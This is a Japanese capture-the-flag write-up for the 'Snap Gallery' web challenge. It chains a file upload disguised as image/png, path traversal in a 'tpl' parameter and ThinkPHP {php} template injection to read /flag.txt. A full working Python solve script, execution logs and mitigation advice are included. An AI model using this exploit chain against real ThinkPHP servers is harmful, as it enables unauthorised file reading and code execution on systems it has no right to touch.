# Snap Gallery — Writeup

## 概要

**分類:** Web / Arbitrary File Upload + Path Traversal + Server-Side Template Injection (SSTI)

**対象（演習環境）:** `http://10.234.128.28:22200`

**取得したFlag:** `flag{th1nkphp_template_tag_bypasses_strict_waf}`

この問題では、アップロードしたHTMLファイルをThinkPHPのテンプレートとして読み込ませることで、サーバー上のファイルを読み取れた。ポイントは、単独の既知CVEをそのまま実行したのではなく、**アップロード処理とユーザー指定テンプレートパスの組み合わせ**を利用した点にある。

## 1. 調査の出発点
![alt](./img/スクリーンショット%202026-10-10%200.47.42.png)

ブラウザのエラーページに `ThinkPHP V6.1.4` と表示された。そこでThinkPHPの仕組みと過去の脆弱性を調査した。検索画面ではCVE-2024-44902、CVE-2024-48112や古いThinkPHPのRCE（CVE-2018-20062、CVE-2019-9082）も確認している。

![alt](./img/スクリーンショット%202026-10-10%200.47.47.png)

ただし、**それらのCVEがこの問題で実際に成立した証拠はない**。エラー画面のバージョン表示は調査の手掛かりであり、攻略に直接使った脆弱性はアプリケーションのアップロード・テンプレート指定機能の組み合わせである。

また、提供された画面の `compose.yml` には `php_app` が `./app:/app:ro` でマウントされ、環境変数にテスト用Flagがあることが確認できる。これは開発用設定の画面であり、競技環境のFlagの保存場所を直接証明するものではない。実際のExploitは `/flag.txt` を読んでいる。

## 2. 攻撃方針

1. `/index.php/upload/upload` へファイルを送る。
2. アップロードしたファイルの名前を把握する。
3. `/index.php/index/page?tpl=...` の `tpl` に相対パスを指定する。
4. 保存されたファイルをテンプレートとしてレンダリングさせる。
5. ThinkPHPの `{php}...{/php}` タグでファイルの内容を出力させる。

このチェーンは、単なるアップロード成功ではなく、**保存ファイルをサーバー側のテンプレートエンジンに処理させること**が決定的である。

## 3. アップロードの工夫

Pythonの `requests` で、拡張子 `.html` のファイルを `image/png` として送信した。

```python
filename = 'snap_' + uuid.uuid4().hex[:12] + '.html'
marker = 'SNAP_RESULT_'
payload = marker + "{php}echo file_get_contents('/flag.txt');{/php}" + '_END'
response = session.post(
    base + '/index.php/upload/upload',
    files={'image': (filename, payload.encode(), 'image/png')},
    timeout=20,
)
```

**なぜこの方法か:** HTTP multipartの `Content-Type` は送信者が設定できるメタデータであり、それだけでファイルの実体がPNGであることは保証されない。今回の成功ログは、HTML名と `image/png` の組み合わせでアップロードが受理されたことを示す。ただし、サーバー側が具体的にどの検証を欠いていたかは、サーバーソース未提示のため断定しない。

`{php}` タグを使うのは、通常の `<?php ... ?>` をファイルに書いてWebサーバーにPHPとして直接実行させる攻撃とは異なる。**ThinkPHPのテンプレート構文として解釈させる**ことを狙った。

## 4. テンプレートパスの調査

最初から正しい相対パスが分かっていたわけではない。修正版では次の候補を順番に試すようにした。

```python
paths = [
    f'../../storage/topic/{stem}',
    f'../../../storage/topic/{stem}',
    f'../storage/topic/{stem}',
    f'storage/topic/{stem}',
]
```

ここで `stem` はアップロードした `.html` ファイル名から拡張子を除いた部分。テンプレートエンジンが拡張子を補完する想定で指定している。

実行ログでは、最初の2候補がHTTP 500となり、3候補目の `../storage/topic/snap_4cff70c6e1dc` でHTTP 200とFlag出力を確認した。したがって、**成功した相対パスは3候補目**であり、初期スクリプトに書かれていた `../../storage/topic/...` ではない。

HTTP 500のエラーページには `ThinkPHP V6.1.4` と表示された。これだけでパストラバーサルの成立は証明できないが、3候補目でアップロード済みテンプレート内のマーカーとFlagが返ったことは、指定したファイルがテンプレートとして評価された強い証拠である。

## 5. 実行結果（スクリーンショットの転記）

```text
$ python3 solve_snap_gallery_fixed.py http://10.234.128.28:22200
[+] Upload: snap_4cff70c6e1dc.html
[+] Upload HTTP 200 | 🎉 アップロード成功！ 保存名: snap_4cff70c6e1dc.html

[+] Probe 1/4: ../../storage/topic/snap_4cff70c6e1dc
[+] HTTP 500 | 系统发生错误 页面错误! 请稍后再试~ ThinkPHP V6.1.4
[i] Full response: snap_debug/render_1.html

[+] Probe 2/4: ../../../storage/topic/snap_4cff70c6e1dc
[+] HTTP 500 | 系统发生错误 页面错误! 请稍后再试~ ThinkPHP V6.1.4
[i] Full response: snap_debug/render_2.html

[+] Probe 3/4: ../storage/topic/snap_4cff70c6e1dc
[+] HTTP 200 | SNAP_RESULT_flag{th1nkphp_template_tag_bypasses_strict_waf}_END
[+] FLAG OUTPUT: flag{th1nkphp_template_tag_bypasses_strict_waf}
```
![alt](./img/スクリーンショット%202026-10-10%2017.41.26.png)
**結果:** アップロードしたテンプレートの `{php}` ブロックを経由して `/flag.txt` の内容を読み出した。これはサーバー側のPHPコード評価が起きたことを示すが、OSコマンド実行を別途検証した記録ではない。

## 6. 解法スクリプト全文

```python
#!/usr/bin/env python3
"""Snap Gallery CTF: upload and diagnose ThinkPHP template evaluation."""
import argparse
import html
import re
import uuid
from pathlib import Path
from urllib.parse import urlsplit
import requests
from bs4 import BeautifulSoup


def summary(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    for tag in soup(['style', 'script']):
        tag.decompose()
    text = soup.get_text(' ', strip=True)
    for pattern in (r'(?:模板文件不存在|模板不存在|template file not exists|template not exists)[^\n]{0,250}',
                    r'(?:syntax error|ParseError|ErrorException|Exception|错误位置|错误信息)[^\n]{0,300}'):
        match = re.search(pattern, text, re.I)
        if match:
            return match.group(0)[:500]
    return text[:650] or response.text[:650]


def main():
    p = argparse.ArgumentParser()
    p.add_argument('url', help='http://10.234.128.28:22200 (use colon for port)')
    p.add_argument('--flag-path', default='/flag.txt')
    p.add_argument('--debug-dir', default='snap_debug')
    args = p.parse_args()
    base = args.url.strip().strip('<>').rstrip('/')
    if base.startswith('[') and '](' in base:
        base = base[1:base.index('](')]
    parsed = urlsplit(base)
    if parsed.scheme not in ('http', 'https') or not parsed.hostname:
        p.error('invalid URL')
    output = Path(args.debug_dir)
    output.mkdir(exist_ok=True)
    name = 'snap_' + uuid.uuid4().hex[:12] + '.html'
    marker = 'SNAP_RESULT_'
    payload = marker + '{php}echo file_get_contents(' + repr(args.flag_path) + ');{/php}' + '_END'
    session = requests.Session()
    try:
        print('[+] Upload:', name)
        r = session.post(base + '/index.php/upload/upload', files={'image': (name, payload.encode(), 'image/png')}, timeout=20)
        (output / 'upload.html').write_text(r.text, encoding='utf-8')
        print('[+] Upload HTTP', r.status_code, '|', summary(r))
        if r.status_code != 200 or not any(x in r.text for x in ('アップロード成功', '上传成功', '保存名:')):
            print('[-] Upload success not confirmed; see', output / 'upload.html')
            return 1
        # Probe alternate relative paths: actual resolution depends on template engine rules.
        stem = name[:-5]
        paths = [f'../../storage/topic/{stem}', f'../../../storage/topic/{stem}',
                 f'../storage/topic/{stem}', f'storage/topic/{stem}']
        for i, tpl in enumerate(paths, 1):
            print(f'\n[+] Probe {i}/{len(paths)}: {tpl}')
            r = session.get(base + '/index.php/index/page', params={'tpl': tpl}, timeout=20)
            path = output / f'render_{i}.html'
            path.write_text(r.text, encoding='utf-8')
            print('[+] HTTP', r.status_code, '|', summary(r))
            m = re.search(re.escape(marker) + r'(.*?)_END', r.text, re.S)
            if m:
                print('[+] FLAG OUTPUT:', html.unescape(m.group(1)))
                return 0
            print('[i] Full response:', path)
        print('\n[-] No marker found. Share snap_debug/render_*.html error message for next adjustment.')
        return 1
    except requests.RequestException as e:
        print('[-] Request failed:', e)
        return 1

if __name__ == '__main__':
    raise SystemExit(main())
```

実行に必要なライブラリとコマンド:

```bash
python3 -m pip install requests beautifulsoup4
python3 solve_snap_gallery_fixed.py http://10.234.128.28:22200
```

成功しなかった候補のレスポンスは `snap_debug/render_*.html` に保存される。単にHTTPステータスだけを見るのではなく、**エラーページを残して候補ごとの差を調べられるようにした**のが修正版の改善点である。

## 7. 参考にした技術情報と位置づけ

- [OWASP — Unrestricted File Upload](https://community.owasp.org/vulnerabilities/Unrestricted_File_Upload): アップロードファイルのメタデータ、内容、保存場所と、その後の解釈処理を組み合わせて考えるための参考資料。
- [OWASP — File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html): 拡張子、MIME、内容検査を単独で信用しないことや多層防御の考え方。
- [JIJINCMS — テンプレート構文](https://www.jijincms.com/document/jijincms6/template/138.html): ThinkPHP系テンプレート構文の `{php}...{/php}` の例。**問題サーバーの設定そのものを保証する資料ではない**。
- [NVD — CVE-2018-20062](https://nvd.nist.gov/vuln/detail/CVE-2018-20062) / [NVD — CVE-2019-9082](https://nvd.nist.gov/vuln/detail/CVE-2019-9082): 調査時に参照した旧ThinkPHP関連の既知問題。今回のExploitがこれらのCVEを利用したとは主張しない。
- [NVD — CVE-2024-44902](https://nvd.nist.gov/vuln/detail/CVE-2024-44902) / [NVD — CVE-2024-48112](https://nvd.nist.gov/vuln/detail/CVE-2024-48112): バージョンを手掛かりに調査した候補。今回の成立原因と同一視しない。

これらは**調査の方向性を考えるための資料**であり、問題のソースコードを確認して脆弱性の成立箇所を確定したという意味ではない。

## 8. 対策

アップロードファイルをテンプレートとして読み込まないことが第一。アップロード先とテンプレートディレクトリを分離し、`tpl` の値は許可済みテンプレート名のリストから選ぶ。相対パス `../` の除去だけに頼らず、正規化後のパスが許可ディレクトリ内にあることを確認する。ファイルの拡張子・実体・MIMEを検査し、テンプレート内のPHP評価機能を不要なら無効にする。エラー画面のフレームワーク情報も公開しない。

## 9. まとめ

今回の工夫は、**フレームワークのバージョンから既知CVEを探すだけで終わらず、アップロード機能と `tpl` パラメータの接点を探したこと**、**MIME指定とテンプレートタグを組み合わせたこと**、**パス候補を自動で試し、エラーHTMLを保存して検証したこと**の3点にある。実際の成功ログに基づき、3候補目でFlag取得に至ったことまで確認できる。
